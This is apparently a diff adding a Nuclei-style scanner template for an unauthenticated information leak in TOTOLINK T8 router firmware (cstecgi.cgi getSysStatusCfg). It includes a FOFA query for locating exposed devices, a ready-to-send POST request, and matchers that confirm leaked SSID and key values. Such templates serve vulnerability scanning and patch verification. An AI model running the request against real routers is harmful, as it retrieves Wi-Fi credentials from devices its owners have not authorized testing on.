@@ -1,0 +1,39 @@
+id: totolink-t8-cstecgicgi-getsysstatuscfg-info-leak
+
+info:
+  name: "TOTOLINK T8 cstecgi.cgi getSysStatusCfg 接口敏感信息泄露"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: title="TOTOLINK"
+        Totolink T8 4.1.5cu.833_20220905版本中，/cgi-bin/cstecgi.cgi组件的getSysStatusCfg接口存在安全缺陷。攻击者通过构造特定ssid/key参数请求，可绕过访问控制机制获取系统敏感配置数据。该漏洞允许远程未授权访问，已确认存在公开利用链。厂商已发布4.1.5cu.862_B20230228版本修复此安全缺陷。
+  tags: TOTOLINK
+
+http:
+- raw:
+  - |
+    POST /cgi-bin/cstecgi.cgi HTTP/1.1
+    Host: {{Hostname}}
+    Accept:application/json,text/javascript，*/*;q=0.01
+    X-Requested-with: XMLHttpRequest
+    Content-Type: application/x-www-form-urlencoded:charset=UTF-8
+    Accept-Encoding:gzip,deflate
+    Accept-Language:zh-Tw,zh:g=0.9.en-US:g=0.8.en:g=0.7
+    Connection:close
+
+    {
+    "topicurl":"getSysStatusCfg",
+    "token":""
+    }
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'ssid'
+  - type: word
+    part: body
+    words:
+    - 'key'
